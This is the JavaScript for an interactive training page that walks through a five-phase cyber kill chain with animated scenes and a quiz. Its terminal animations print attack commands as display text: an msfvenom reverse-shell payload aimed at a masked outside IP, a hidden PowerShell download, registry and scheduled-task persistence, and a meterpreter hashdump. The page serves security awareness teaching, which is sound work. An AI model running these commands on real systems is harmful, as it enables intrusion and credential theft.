/* ============================================================
   CYBER KILL CHAIN · Application Logic (5-Phase Model)
   ============================================================ */

document.addEventListener('DOMContentLoaded', () => {
  initScrollAnimations();
  initNavigation();
  initProgressBar();
  initChainDiagram();
  initPhaseCarousel();
  initScenes();
  initCaseStudyTimeline();
  initQuizOrder();
  initQuizMatch();
  initQuizDefend();
  initQuizSubmit();
  addSVGGradient();
});

/* --- SVG Gradient for Results Ring --- */
function addSVGGradient() {
  const svg = document.querySelector('.results-ring-svg');
  if (!svg) return;
  const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
  const grad = document.createElementNS('http://www.w3.org/2000/svg', 'linearGradient');
  grad.setAttribute('id', 'scoreGradient');
  grad.setAttribute('x1', '0%'); grad.setAttribute('y1', '0%');
  grad.setAttribute('x2', '100%'); grad.setAttribute('y2', '0%');
  const s1 = document.createElementNS('http://www.w3.org/2000/svg', 'stop');
  s1.setAttribute('offset', '0%'); s1.setAttribute('stop-color', '#00c8ff');
  const s2 = document.createElementNS('http://www.w3.org/2000/svg', 'stop');
  s2.setAttribute('offset', '100%'); s2.setAttribute('stop-color', '#7c5cfc');
  grad.append(s1, s2); defs.appendChild(grad); svg.prepend(defs);
}

/* --- Scroll Animations --- */
function initScrollAnimations() {
  const elements = document.querySelectorAll('.anim-fade-up');
  const observer = new IntersectionObserver(
    (entries) => entries.forEach((e) => { if (e.isIntersecting) e.target.classList.add('visible'); }),
    { threshold: 0.08, rootMargin: '0px 0px -30px 0px' }
  );
  elements.forEach((el) => observer.observe(el));
  requestAnimationFrame(() => {
    elements.forEach((el) => {
      const r = el.getBoundingClientRect();
      if (r.top < window.innerHeight && r.bottom > 0) el.classList.add('visible');
    });
  });
}

/* --- Navigation --- */
function initNavigation() {
  const nav = document.getElementById('nav');
  window.addEventListener('scroll', () => {
    nav.classList.toggle('scrolled', window.scrollY > 60);
  }, { passive: true });
  document.querySelectorAll('a[href^="#"]').forEach((link) => {
    link.addEventListener('click', (e) => {
      const t = document.querySelector(link.getAttribute('href'));
      if (t) { e.preventDefault(); t.scrollIntoView({ behavior: 'smooth' }); }
    });
  });
}

/* --- Progress Bar --- */
function initProgressBar() {
  const bar = document.getElementById('progressBar');
  window.addEventListener('scroll', () => {
    const h = document.documentElement.scrollHeight - window.innerHeight;
    bar.style.width = (window.scrollY / h) * 100 + '%';
  }, { passive: true });
}

/* --- Chain Diagram (5 phases) --- */
const PHASE_COUNT = 5;
const chainData = {
  1: { name: 'Reconnaissance', desc: 'The attacker researches the target, scanning networks, harvesting emails, and mapping out the organization\'s attack surface.' },
  2: { name: 'Arm & Deliver', desc: 'The attacker crafts a tailored weapon (malware or a malicious document) and delivers it to the target through phishing emails or compromised channels.' },
  3: { name: 'Exploitation', desc: 'The weapon activates: a vulnerability is triggered, code executes, and the attacker gains their initial foothold in the system.' },
  4: { name: 'Establish Control', desc: 'The attacker installs persistent backdoors and establishes an encrypted command channel back to their server for ongoing remote access.' },
  5: { name: 'Exfiltration', desc: 'The endgame: sensitive data is located, compressed, and secretly transferred to the attacker\'s external servers.' },
};

function initChainDiagram() {
  const nodes = document.querySelectorAll('.chain-node');
  const detail = document.getElementById('chainDetail');
  const lineFill = document.getElementById('chainLineFill');
  nodes.forEach((node) => {
    node.addEventListener('click', () => {
      const phase = parseInt(node.dataset.phase);
      nodes.forEach((n) => {
        n.classList.toggle('active', parseInt(n.dataset.phase) <= phase);
      });
      lineFill.style.width = ((phase - 1) / (PHASE_COUNT - 1)) * 100 + '%';
      const d = chainData[phase];
      detail.innerHTML = `<div class="chain-detail-inner"><span class="chain-detail-phase">0${phase}</span><div class="chain-detail-text"><h4>${d.name}</h4><p>${d.desc}</p></div></div>`;
    });
  });
  animateChainOnScroll(nodes, lineFill);
}

function animateChainOnScroll(nodes, lineFill) {
  let animated = false;
  const observer = new IntersectionObserver((entries) => {
    entries.forEach((e) => {
      if (e.isIntersecting && !animated) {
        animated = true;
        nodes.forEach((n, i) => setTimeout(() => {
          n.classList.add('active');
          lineFill.style.width = (i / (PHASE_COUNT - 1)) * 100 + '%';
        }, i * 250));
        setTimeout(() => {
          nodes.forEach((n) => n.classList.remove('active'));
          lineFill.style.width = '0%';
        }, nodes.length * 250 + 1500);
      }
    });
  }, { threshold: 0.3 });
  observer.observe(document.getElementById('chainDiagram'));
}


/* --- Case Study Timeline (staggered scroll reveal) --- */
function initCaseStudyTimeline() {
  const steps = document.querySelectorAll('.case-step');
  if (!steps.length) return;
  const observer = new IntersectionObserver((entries) => {
    entries.forEach((e) => {
      if (e.isIntersecting) {
        e.target.classList.add('active');
      }
    });
  }, { threshold: 0.3, rootMargin: '0px 0px -40px 0px' });
  steps.forEach((s) => observer.observe(s));
}


/* ============================================================
   SCENE SYSTEM · helper utilities
   ============================================================ */

function delay(ms) { return new Promise((r) => setTimeout(r, ms)); }

function typeText(el, text, speed = 40) {
  return new Promise((resolve) => {
    let i = 0;
    el.textContent = '';
    const iv = setInterval(() => {
      el.textContent += text[i++];
      if (i >= text.length) { clearInterval(iv); resolve(); }
    }, speed);
  });
}

function addTermLine(container, html, cls = '') {
  const div = document.createElement('div');
  div.className = 'term-line ' + cls;
  div.innerHTML = html;
  container.appendChild(div);
  requestAnimationFrame(() => div.classList.add('visible'));
  return div;
}

function addFsItem(tree, item) {
  const div = document.createElement('div');
  div.className = item.cls;
  div.textContent = item.text;
  tree.appendChild(div);
  requestAnimationFrame(() => {
    if (div.classList.contains('install-fs-item')) div.classList.add('visible');
  });
}

function formatMB(mb) {
  if (mb >= 1000) return (mb / 1000).toFixed(1) + ' GB';
  if (mb < 1) return (mb * 1000).toFixed(0) + ' KB';
  return Math.round(mb) + ' MB';
}

/* ============================================================
   PHASES CAROUSEL
   ============================================================ */

let currentPhaseIndex = 0;
const PHASE_TOTAL = 5;
const sceneControllers = {};

function initPhaseCarousel() {
  const carousel = document.getElementById('phasesCarousel');
  if (!carousel) return;

  const tabs = carousel.querySelectorAll('.phases-tab');
  const slides = carousel.querySelectorAll('.phases-slide');
  const indicator = document.getElementById('phasesTabIndicator');
  const prevBtn = document.getElementById('phasesPrev');
  const nextBtn = document.getElementById('phasesNext');
  const currentLabel = document.getElementById('phasesCurrent');

  function updateIndicator() {
    const activeTab = tabs[currentPhaseIndex];
    if (!activeTab || !indicator) return;
    const tabRect = activeTab.getBoundingClientRect();
    const barRect = activeTab.parentElement.getBoundingClientRect();
    indicator.style.left = (tabRect.left - barRect.left) + 'px';
    indicator.style.width = tabRect.width + 'px';
  }

  function goTo(index) {
    if (index < 0 || index >= PHASE_TOTAL || index === currentPhaseIndex) return;
    const prevIndex = currentPhaseIndex;
    currentPhaseIndex = index;

    slides.forEach((s, i) => {
      s.classList.toggle('active', i === index);
      s.classList.toggle('exit-left', i < index && i === prevIndex);
    });
    tabs.forEach((t, i) => {
      t.classList.toggle('active', i === index);
      t.setAttribute('aria-selected', i === index ? 'true' : 'false');
    });

    currentLabel.textContent = String(index + 1).padStart(2, '0');
    prevBtn.disabled = index === 0;
    nextBtn.disabled = index === PHASE_TOTAL - 1;

    updateIndicator();

    const sceneName = slides[index].querySelector('.scene')?.dataset.scene;
    if (sceneName && sceneControllers[sceneName] && sceneControllers[sceneName].onEnter) {
      sceneControllers[sceneName].onEnter();
    }

    document.dispatchEvent(new CustomEvent('mascot:phase', {
      detail: { index, sceneName }
    }));
  }

  tabs.forEach((t) => t.addEventListener('click', () => goTo(parseInt(t.dataset.index))));
  prevBtn.addEventListener('click', () => goTo(currentPhaseIndex - 1));
  nextBtn.addEventListener('click', () => goTo(currentPhaseIndex + 1));

  document.addEventListener('keydown', (e) => {
    if (e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') return;
    const target = e.target;
    if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) return;

    const rect = carousel.getBoundingClientRect();
    const visible = rect.top < window.innerHeight * 0.6 && rect.bottom > window.innerHeight * 0.2;
    if (!visible) return;

    if (e.key === 'ArrowLeft') { e.preventDefault(); goTo(currentPhaseIndex - 1); }
    if (e.key === 'ArrowRight') { e.preventDefault(); goTo(currentPhaseIndex + 1); }
  });

  const viewport = carousel.querySelector('.phases-viewport');
  let touchX = null;
  viewport.addEventListener('touchstart', (e) => { touchX = e.touches[0].clientX; }, { passive: true });
  viewport.addEventListener('touchend', (e) => {
    if (touchX == null) return;
    const dx = e.changedTouches[0].clientX - touchX;
    if (Math.abs(dx) > 50) {
      if (dx < 0) goTo(currentPhaseIndex + 1);
      else goTo(currentPhaseIndex - 1);
    }
    touchX = null;
  });

  window.addEventListener('resize', updateIndicator);
  requestAnimationFrame(() => {
    requestAnimationFrame(updateIndicator);
  });
  prevBtn.disabled = true;
}

/* Mark a phase tab as completed after the user finishes that scene */
function markPhaseCompleted(sceneName) {
  const order = ['recon', 'armdeliver', 'exploit', 'control', 'exfil'];
  const idx = order.indexOf(sceneName);
  if (idx < 0) return;
  const tab = document.querySelectorAll('.phases-tab')[idx];
  if (tab) tab.classList.add('completed');

  document.dispatchEvent(new CustomEvent('mascot:complete', {
    detail: { sceneName, index: idx }
  }));
}

function markPhaseIncomplete(sceneName) {
  const order = ['recon', 'armdeliver', 'exploit', 'control', 'exfil'];
  const idx = order.indexOf(sceneName);
  if (idx < 0) return;
  const tab = document.querySelectorAll('.phases-tab')[idx];
  if (tab) tab.classList.remove('completed');
}

/* ============================================================
   INTERACTIVE SCENES
   Each scene is driven by user-clicked action buttons in the
   .scene-actions toolbar. Scenes expose: { reset, onEnter } via
   sceneControllers so the carousel can coordinate state.
   ============================================================ */

function initScenes() {
  initReconScene();
  initArmDeliverScene();
  initExploitScene();
  initControlScene();
  initExfilScene();
}

/* Helper to wire a scene's action buttons by data-action name */
function wireActions(sceneEl, handlers) {
  const toolbar = sceneEl.querySelector('.scene-actions');
  if (!toolbar) return {};
  const btns = {};
  toolbar.querySelectorAll('.scene-action-btn').forEach((btn) => {
    const name = btn.dataset.action;
    btns[name] = btn;
    btn.addEventListener('click', async () => {
      if (btn.disabled || btn.classList.contains('done') || btn.classList.contains('running')) return;
      const handler = handlers[name];
      if (!handler) return;
      btn.classList.add('running');
      try {
        await handler(btn, btns);
      } finally {
        btn.classList.remove('running');
      }
    });
  });
  return btns;
}

function setHint(sceneEl, text, tone) {
  const hint = sceneEl.querySelector('[data-scene-hint]');
  if (!hint) return;
  hint.innerHTML = text;
  hint.classList.remove('success');
  if (tone === 'success') hint.classList.add('success');
}

/* ============================================================
   RECON · interactive LinkedIn harvest
   ============================================================ */
function initReconScene() {
  const scene = document.querySelector('[data-scene="recon"]');
  if (!scene) return;

  const profilesContainer = scene.querySelector('#reconProfiles');
  const harvestList = scene.querySelector('#harvestList');
  const countEl = scene.querySelector('#harvestCount');
  const searchText = scene.querySelector('.recon-search-text');
  const searchCaret = scene.querySelector('.recon-search-caret');

  const profiles = [
    { initials: 'JD', name: 'Jane Doe', role: 'CFO', email: 'j.doe@acme-corp.com' },
    { initials: 'MS', name: 'Mike Smith', role: 'IT Administrator', email: 'm.smith@acme-corp.com' },
    { initials: 'AK', name: 'Alice Kim', role: 'HR Director', email: 'a.kim@acme-corp.com' },
    { initials: 'BJ', name: 'Bob Johnson', role: 'Software Engineer', email: 'b.johnson@acme-corp.com' },
    { initials: 'CL', name: 'Carol Lee', role: 'Security Analyst', email: 'c.lee@acme-corp.com' },
    { initials: 'DW', name: 'David Wang', role: 'VP Engineering', email: 'd.wang@acme-corp.com' },
  ];

  const harvested = new Set();
  let scanned = false;

  function harvestProfile(div, p) {
    if (harvested.has(p.email)) return;
    harvested.add(p.email);
    div.classList.add('harvested');

    const entry = document.createElement('div');
    entry.className = 'harvest-entry';
    entry.textContent = p.email;
    harvestList.appendChild(entry);
    requestAnimationFrame(() => entry.classList.add('visible'));
    countEl.textContent = harvested.size;

    if (harvested.size === profiles.length) {
      setHint(scene, '<strong>All targets harvested.</strong> The attacker now has every IT staffer\'s email address.', 'success');
      btns.harvestAll.disabled = true;
      btns.harvestAll.classList.add('done');
      markPhaseCompleted('recon');
    } else {
      setHint(scene, `Harvested <strong>${harvested.size}/${profiles.length}</strong>. Keep going, or click <strong>Harvest All</strong>.`);
    }
  }

  async function runScan(btn) {
    btn.disabled = true;
    searchText.classList.remove('recon-search-placeholder');
    searchCaret.classList.add('active');
    await typeText(searchText, 'IT staff acme-corp', 55);
    await delay(300);
    searchCaret.classList.remove('active');

    for (let i = 0; i < profiles.length; i++) {
      const p = profiles[i];
      const div = document.createElement('div');
      div.className = 'recon-profile';
      div.dataset.email = p.email;
      div.innerHTML = `<div class="recon-avatar">${p.initials}</div><div class="recon-profile-info"><span class="recon-profile-name">${p.name}</span><span class="recon-profile-role">${p.role}</span></div>`;
      profilesContainer.appendChild(div);
      await delay(70);
      div.classList.add('visible');
    }

    profilesContainer.querySelectorAll('.recon-profile').forEach((div) => {
      const p = profiles.find((pp) => pp.email === div.dataset.email);
      div.classList.add('interactive');
      div.addEventListener('click', () => harvestProfile(div, p));
    });

    scanned = true;
    btn.classList.add('done');
    btn.innerHTML = '<span class="scene-action-icon">&#10003;</span> Scan Complete';
    btns.harvestAll.disabled = false;
    btns.reset.disabled = false;
    setHint(scene, 'Click any profile to harvest their email, or <strong>Harvest All</strong>.');
  }

  async function harvestAll(btn) {
    btn.disabled = true;
    const remaining = [...profilesContainer.querySelectorAll('.recon-profile:not(.harvested)')];
    for (const div of remaining) {
      const p = profiles.find((pp) => pp.email === div.dataset.email);
      harvestProfile(div, p);
      await delay(140);
    }
    btn.classList.add('done');
  }

  function reset() {
    profilesContainer.innerHTML = '';
    harvestList.innerHTML = '';
    countEl.textContent = '0';
    searchText.textContent = 'Search employees...';
    searchText.classList.add('recon-search-placeholder');
    searchCaret.classList.remove('active');
    harvested.clear();
    scanned = false;

    btns.scan.disabled = false;
    btns.scan.classList.remove('done');
    btns.scan.innerHTML = '<span class="scene-action-icon">&#9655;</span> Start Scan';
    btns.harvestAll.disabled = true;
    btns.harvestAll.classList.remove('done');
    btns.reset.disabled = true;
    setHint(scene, 'Click <strong>Start Scan</strong> to begin searching for employee data.');
    markPhaseIncomplete('recon');
  }

  const btns = wireActions(scene, { scan: runScan, harvestAll, reset });

  sceneControllers.recon = { reset, onEnter() {} };
}

/* ============================================================
   ARM & DELIVER · build payload, weaponize, deliver
   ============================================================ */
function initArmDeliverScene() {
  const scene = document.querySelector('[data-scene="armdeliver"]');
  if (!scene) return;

  const terminal = scene.querySelector('#armTerminal');
  const output = scene.querySelector('#armOutput');
  const connector = scene.querySelector('#armConnector');
  const emailMain = scene.querySelector('#armEmailMain');
  const badge = scene.querySelector('#armEmailBadge');

  const buildLines = [
    { html: '<span class="term-prompt">$ </span><span class="term-cmd">msfvenom -p windows/meterpreter/reverse_tcp \\</span>', delay: 220 },
    { html: '<span class="term-output">  LHOST=185.47.xx.xx -f vba -o payload.vba</span>', delay: 260 },
    { html: '<span class="term-warn">[*] Generating payload...</span>', delay: 350 },
    { html: '<span class="term-success">[+] Payload saved (684 bytes)</span>', delay: 220 },
  ];
  const weaponLines = [
    { html: '<span class="term-output">&nbsp;</span>', delay: 100 },
    { html: '<span class="term-prompt">$ </span><span class="term-cmd">python3 inject_macro.py --output Q1_Invoice.docm</span>', delay: 260 },
    { html: '<span class="term-warn">[*] Injecting macro...</span>', delay: 350 },
    { html: '<span class="term-success">[+] Weaponized document created</span>', delay: 200 },
    { html: '<span class="term-danger">[!] Auto-execute on open</span>', delay: 200 },
  ];

  function clearPlaceholder() {
    const ph = terminal.querySelector('.term-placeholder');
    if (ph) ph.remove();
  }

  async function build(btn) {
    btn.disabled = true;
    clearPlaceholder();
    for (const line of buildLines) {
      addTermLine(terminal, line.html);
      terminal.scrollTop = terminal.scrollHeight;
      await delay(line.delay);
    }
    btn.classList.add('done');
    btn.innerHTML = '<span class="scene-action-num">1</span> Payload Built';
    btns.weaponize.disabled = false;
    btns.reset.disabled = false;
    setHint(scene, 'Reverse shell is ready. Now <strong>Weaponize</strong> it into a document.');
  }

  async function weaponize(btn) {
    btn.disabled = true;
    for (const line of weaponLines) {
      addTermLine(terminal, line.html);
      terminal.scrollTop = terminal.scrollHeight;
      await delay(line.delay);
    }
    await delay(250);
    output.classList.add('visible');
    btn.classList.add('done');
    btn.innerHTML = '<span class="scene-action-num">2</span> Weaponized';
    btns.send.disabled = false;
    setHint(scene, 'Malicious doc is armed. Time to <strong>Send</strong> it to Mike Smith.');
  }

  async function send(btn) {
    btn.disabled = true;
    connector.classList.add('active');
    await delay(700);

    emailMain.innerHTML = '';
    const msg = document.createElement('div');
    msg.className = 'email-message';
    msg.innerHTML = `
      <div class="email-msg-header">
        <div class="email-msg-from">
          Sarah Chen (Accounting)
          <span class="email-spoof">SPOOFED</span>
        </div>
        <div class="email-msg-to">To: m.smith@acme-corp.com</div>
        <div class="email-msg-subject">URGENT: Q1 Invoice Requires Approval</div>
      </div>
      <div class="email-msg-body">
        <p>Hi Mike,</p>
        <p>The attached invoice needs your <span class="email-urgency">immediate approval before end of day</span>.
        Finance flagged this as time-sensitive.</p>
        <p>Thanks,<br>Sarah Chen</p>
      </div>
      <div class="email-attachment">
        <span class="email-attachment-icon">&#128206;</span>
        Q1_Invoice.docm
        <span style="margin-left:auto;font-size:11px;color:var(--text-tertiary)">342 KB</span>
      </div>
    `;
    emailMain.appendChild(msg);
    badge.textContent = '1';
    badge.classList.add('visible');
    await delay(200);
    msg.classList.add('visible');
    await delay(900);
    msg.querySelector('.email-spoof').classList.add('visible');

    btn.classList.add('done');
    btn.innerHTML = '<span class="scene-action-num">3</span> Email Delivered';
    setHint(scene, '<strong>Delivered.</strong> The bait is in Mike\'s inbox. The attacker now waits for him to take it.', 'success');
    markPhaseCompleted('armdeliver');
  }

  function reset() {
    terminal.innerHTML = '<div class="term-line visible term-placeholder">$ <span class="term-caret">_</span></div>';
    output.classList.remove('visible');
    connector.classList.remove('active');
    emailMain.innerHTML = '<div class="email-empty">No new messages</div>';
    badge.textContent = '0';
    badge.classList.remove('visible');

    btns.build.disabled = false;
    btns.build.classList.remove('done');
    btns.build.innerHTML = '<span class="scene-action-num">1</span> Build Payload';
    btns.weaponize.disabled = true;
    btns.weaponize.classList.remove('done');
    btns.weaponize.innerHTML = '<span class="scene-action-num">2</span> Weaponize Doc';
    btns.send.disabled = true;
    btns.send.classList.remove('done');
    btns.send.innerHTML = '<span class="scene-action-num">3</span> Send Phishing Email';
    btns.reset.disabled = true;
    setHint(scene, 'Walk through the three steps to craft and deliver the attack.');
    markPhaseIncomplete('armdeliver');
  }

  const btns = wireActions(scene, { build, weaponize, send, reset });
  sceneControllers.armdeliver = { reset, onEnter() {} };
}

/* ============================================================
   EXPLOIT · user clicks "Enable Content" themselves
   ============================================================ */
function initExploitScene() {
  const scene = document.querySelector('[data-scene="exploit"]');
  if (!scene) return;

  const doc = scene.querySelector('#exploitDoc');
  const banner = scene.querySelector('#docBanner');
  const overlay = scene.querySelector('#exploitOverlay');
  const terminal = scene.querySelector('#exploitTerminal');
  const btn = scene.querySelector('#docEnableBtn');

  let armed = false;
  let played = false;

  function setupPulse() {
    btn.style.animation = 'pulse-btn 1.6s ease-in-out infinite';
  }

  function stopPulse() {
    btn.style.animation = 'none';
  }

  async function onEnable() {
    if (played) return;
    played = true;
    stopPulse();
    banner.classList.add('clicked');
    btn.textContent = 'Enabled';
    await delay(450);
    doc.classList.add('blurred');
    overlay.classList.add('visible');

    setHint(scene, '<strong>Too late.</strong> A reverse shell is already running, invisible to Mike.', 'success');

    const lines = [
      { text: 'C:\\> powershell -ep bypass -nop -w hidden', delay: 220 },
      { text: 'Downloading payload from 185.47.xx.xx...', delay: 400 },
      { text: '████████████████████████ 100%', delay: 450 },
      { text: 'Executing in memory...', delay: 280 },
      { text: '[+] Meterpreter session 1 opened', delay: 380 },
      { text: '[+] Privilege: ACME\\m.smith', delay: 260 },
      { text: '[+] Target: DESKTOP-ACME-47', delay: 200 },
    ];
    for (const line of lines) {
      const div = document.createElement('div');
      div.className = 'term-line';
      div.textContent = line.text;
      terminal.appendChild(div);
      await delay(60);
      div.classList.add('visible');
      await delay(line.delay);
    }
    btns.reset.disabled = false;
    markPhaseCompleted('exploit');
  }

  function reset() {
    played = false;
    banner.classList.remove('clicked');
    btn.textContent = 'Enable Content';
    doc.classList.remove('blurred');
    overlay.classList.remove('visible');
    terminal.innerHTML = '';
    setupPulse();
    btns.reset.disabled = true;
    setHint(scene, 'Click the glowing <strong>Enable Content</strong> button to see what really happens.');
    markPhaseIncomplete('exploit');
  }

  btn.addEventListener('click', onEnable);
  const btns = wireActions(scene, { reset });

  setupPulse();
  sceneControllers.exploit = { reset, onEnter() { if (!played) setupPulse(); } };
}

/* ============================================================
   CONTROL · install persistence, open C2, send commands
   ============================================================ */
function initControlScene() {
  const scene = document.querySelector('[data-scene="control"]');
  if (!scene) return;

  const log = scene.querySelector('#controlLog');
  const tree = scene.querySelector('#controlTree');
  const packets = scene.querySelector('#controlPackets');
  const terminal = scene.querySelector('#controlTerminal');

  const entries = [
    { time: '14:32:01', type: 'write', cls: 'install-log-type--write', msg: 'svchost_update.exe dropped to C:\\Windows\\Temp\\' },
    { time: '14:32:02', type: 'write', cls: 'install-log-type--write', msg: 'mshelper.dll created in AppData\\Local\\' },
    { time: '14:32:03', type: 'reg', cls: 'install-log-type--reg', msg: 'HKCU\\...\\Run → "WindowsHelper" = svchost_update.exe' },
    { time: '14:32:04', type: 'exec', cls: 'install-log-type--exec', msg: 'schtasks /create /tn "SystemUpdate" /sc onlogon' },
    { time: '14:32:05', type: 'net', cls: 'install-log-type--net', msg: 'Outbound → 185.47.xx.xx:4443 (ESTABLISHED)' },
  ];
  const fsItems = [
    { text: 'C:\\Windows\\Temp\\', cls: 'install-fs-folder' },
    { text: '  svchost_update.exe', cls: 'install-fs-item new-file' },
    { text: 'C:\\Users\\m.smith\\AppData\\', cls: 'install-fs-folder' },
    { text: '  Local\\mshelper.dll', cls: 'install-fs-item new-file' },
    { text: 'Registry:', cls: 'install-fs-folder' },
    { text: '  Run → WindowsHelper', cls: 'install-fs-item new-file' },
  ];
  const commands = [
    { html: '<span class="term-success">[+] Beacon: 10.0.0.47 → 185.47.xx.xx</span>', delay: 400 },
    { html: '<span class="term-prompt">meterpreter> </span><span class="term-cmd">sysinfo</span>', delay: 300 },
    { html: '<span class="term-output">Computer : DESKTOP-ACME-47</span>', delay: 140 },
    { html: '<span class="term-output">User     : ACME\\m.smith</span>', delay: 200 },
    { html: '<span class="term-prompt">meterpreter> </span><span class="term-cmd">hashdump</span>', delay: 380 },
    { html: '<span class="term-danger">Administrator:500:aad3b...:::</span>', delay: 150 },
    { html: '<span class="term-prompt">meterpreter> </span><span class="term-cmd">search -f *.xlsx</span>', delay: 380 },
    { html: '<span class="term-output">Found 47 files matching *.xlsx</span>', delay: 200 },
  ];

  let packetInterval = null;

  function clearTerminalPlaceholder() {
    const ph = terminal.querySelector('.term-placeholder');
    if (ph) ph.remove();
  }

  function clearLogEmpty() {
    const e = log.querySelector('.install-empty');
    if (e) e.remove();
  }

  async function install(btn) {
    btn.disabled = true;
    clearLogEmpty();
    let fsIdx = 0;
    for (const e of entries) {
      const row = document.createElement('div');
      row.className = 'install-log-entry';
      row.innerHTML = `<span class="install-log-time">${e.time}</span><span class="install-log-type ${e.cls}">${e.type}</span><span class="install-log-msg">${e.msg}</span>`;
      log.appendChild(row);
      await delay(60);
      row.classList.add('visible');
      if (fsIdx < fsItems.length) {
        addFsItem(tree, fsItems[fsIdx++]);
        await delay(100);
        if (fsIdx < fsItems.length) addFsItem(tree, fsItems[fsIdx++]);
      }
      await delay(300);
    }
    btn.classList.add('done');
    btn.innerHTML = '<span class="scene-action-num">1</span> Persistence Installed';
    btns.beacon.disabled = false;
    btns.reset.disabled = false;
    setHint(scene, 'Backdoor planted. Now open an encrypted tunnel back to the attacker.');
  }

  function startBeacon(btn) {
    if (packetInterval) return;
    btn.disabled = true;
    let packetId = 0;
    packetInterval = setInterval(() => {
      const pkt = document.createElement('div');
      pkt.className = 'c2-packet ' + (packetId % 3 === 0 ? 'c2-packet--in' : 'c2-packet--out');
      pkt.style.animationDuration = (0.9 + Math.random() * 0.5) + 's';
      packets.appendChild(pkt);
      packetId++;
      setTimeout(() => pkt.remove(), 2000);
    }, 380);
    btn.classList.add('done');
    btn.innerHTML = '<span class="scene-action-num">2</span> Beacon Live';
    btns.execute.disabled = false;
    setHint(scene, 'C2 channel is live. The attacker can now issue commands remotely.');
  }

  async function execute(btn) {
    btn.disabled = true;
    clearTerminalPlaceholder();
    for (const cmd of commands) {
      addTermLine(terminal, cmd.html);
      terminal.scrollTop = terminal.scrollHeight;
      await delay(cmd.delay);
    }
    btn.classList.add('done');
    btn.innerHTML = '<span class="scene-action-num">3</span> Commands Sent';
    setHint(scene, '<strong>Full remote control achieved.</strong> Credentials dumped, files enumerated.', 'success');
    markPhaseCompleted('control');
  }

  function reset() {
    if (packetInterval) { clearInterval(packetInterval); packetInterval = null; }
    packets.innerHTML = '';
    log.innerHTML = '<div class="install-empty">Waiting for attacker activity…</div>';
    tree.innerHTML = '';
    terminal.innerHTML = '<div class="term-line visible term-placeholder">meterpreter&gt; <span class="term-caret">_</span></div>';

    btns.install.disabled = false;
    btns.install.classList.remove('done');
    btns.install.innerHTML = '<span class="scene-action-num">1</span> Install Persistence';
    btns.beacon.disabled = true;
    btns.beacon.classList.remove('done');
    btns.beacon.innerHTML = '<span class="scene-action-num">2</span> Open C2 Channel';
    btns.execute.disabled = true;
    btns.execute.classList.remove('done');
    btns.execute.innerHTML = '<span class="scene-action-num">3</span> Send Commands';
    btns.reset.disabled = true;
    setHint(scene, 'Run each step to watch persistence get planted and the backdoor come alive.');
    markPhaseIncomplete('control');
  }

  const btns = wireActions(scene, { install, beacon: startBeacon, execute, reset });

  sceneControllers.control = { reset, onEnter() {} };
}

/* ============================================================
   EXFIL · click files to steal them (or smash-and-grab all)
   ============================================================ */
function initExfilScene() {
  const scene = document.querySelector('[data-scene="exfil"]');
  if (!scene) return;

  const filesContainer = scene.querySelector('#exfilFiles');
  const label = scene.querySelector('#exfilLabel');
  const fill = scene.querySelector('#exfilFill');
  const bytesEl = scene.querySelector('#exfilBytes');
  const countEl = scene.querySelector('#exfilCount');

  const files = [
    { icon: '&#128196;', name: 'customer_database.sql', size: '840 MB', mb: 840 },
    { icon: '&#128196;', name: 'employee_records.xlsx', size: '126 MB', mb: 126 },
    { icon: '&#128196;', name: 'financial_report_Q1.pdf', size: '42 MB', mb: 42 },
    { icon: '&#128273;', name: 'ssh_keys.tar.gz', size: '8 MB', mb: 8 },
    { icon: '&#128196;', name: 'api_credentials.env', size: '2 KB', mb: 0.002 },
    { icon: '&#128196;', name: 'board_meeting_notes.docx', size: '18 MB', mb: 18 },
    { icon: '&#128196;', name: 'source_code.tar.gz', size: '1.4 GB', mb: 1400 },
  ];
  const totalMB = files.reduce((a, f) => a + f.mb, 0);

  let transferred = 0;
  let stolenCount = 0;
  let stealing = false;
  let rendered = false;

  function render() {
    filesContainer.innerHTML = '';
    files.forEach((f, i) => {
      const div = document.createElement('div');
      div.className = 'exfil-file interactive';
      div.dataset.index = i;
      div.innerHTML = `<span class="exfil-file-icon">${f.icon}</span><div class="exfil-file-info"><span class="exfil-file-name">${f.name}</span><span class="exfil-file-size">${f.size}</span></div>`;
      div.addEventListener('click', () => stealFile(div, f));
      filesContainer.appendChild(div);
      setTimeout(() => div.classList.add('visible'), 80 + i * 60);
    });
    rendered = true;
  }

  async function stealFile(div, f) {
    if (stealing || div.classList.contains('stolen')) return;
    stealing = true;

    div.classList.add('stealing');
    label.textContent = `Exfiltrating ${f.name}…`;
    label.classList.add('active');

    btns.reset.disabled = false;

    const steps = Math.max(4, Math.min(10, Math.round(f.mb / 150) + 4));
    for (let s = 0; s < steps; s++) {
      transferred += f.mb / steps;
      const pct = Math.min((transferred / totalMB) * 100, 100);
      fill.style.width = pct + '%';
      bytesEl.textContent = formatMB(transferred) + ' / 2.4 GB';
      await delay(60);
    }

    div.classList.remove('stealing');
    div.classList.add('stolen');
    stolenCount++;
    countEl.textContent = stolenCount;
    stealing = false;

    if (stolenCount === files.length) {
      label.textContent = 'Exfiltration Complete';
      fill.style.width = '100%';
      bytesEl.textContent = '2.4 GB / 2.4 GB';
      setHint(scene, '<strong>Mission complete.</strong> 2.4 GB of sensitive data is now on the attacker\'s server.', 'success');
      btns.stealAll.disabled = true;
      btns.stealAll.classList.add('done');
      markPhaseCompleted('exfil');
    } else {
      setHint(scene, `Stolen <strong>${stolenCount}/${files.length}</strong> files (${formatMB(transferred)}). Keep going.`);
    }
  }

  async function stealAll(btn) {
    btn.disabled = true;
    const remaining = [...filesContainer.querySelectorAll('.exfil-file:not(.stolen):not(.stealing)')];
    for (const div of remaining) {
      const f = files[parseInt(div.dataset.index)];
      await stealFile(div, f);
      await delay(120);
    }
  }

  function reset() {
    transferred = 0;
    stolenCount = 0;
    stealing = false;
    fill.style.width = '0%';
    bytesEl.textContent = '0 MB / 2.4 GB';
    countEl.textContent = '0';
    label.textContent = 'Idle';
    label.classList.remove('active');

    render();

    btns.stealAll.disabled = false;
    btns.stealAll.classList.remove('done');
    btns.reset.disabled = true;
    setHint(scene, 'Click any file to exfiltrate it one at a time, or run a full smash-and-grab.');
    markPhaseIncomplete('exfil');
  }

  const btns = wireActions(scene, { stealAll, reset });

  sceneControllers.exfil = {
    reset,
    onEnter() { if (!rendered) render(); },
  };

  render();
}


/* ============================================================
   QUIZ · 5-phase model
   ============================================================ */

const correctOrder = [
  'Reconnaissance', 'Arm & Deliver', 'Exploitation',
  'Establish Control', 'Exfiltration',
];

